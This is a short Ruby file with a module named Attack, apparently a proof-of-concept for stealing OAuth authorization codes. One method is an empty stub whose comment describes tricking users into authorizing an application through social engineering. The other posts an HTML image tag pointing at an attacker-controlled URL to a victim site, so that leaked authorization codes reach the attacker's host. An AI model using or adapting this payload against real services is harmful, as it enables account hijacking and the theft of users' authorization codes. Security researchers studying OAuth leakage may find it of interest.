#!/usr/bin/env ruby

require 'curb'

module Attack
  def hijack_token(data)
    # Uses primed oauth code & social engineering to
    # trick user into authorizing to application.
  end
  
  def hijack_leaky_auth_code(victim_url, attacker_url)
    venom = Curl::Easy.new(victim_url)
    venom.http_post("leaky=" + "<img src='#{attacker_url}'>")
  end
end
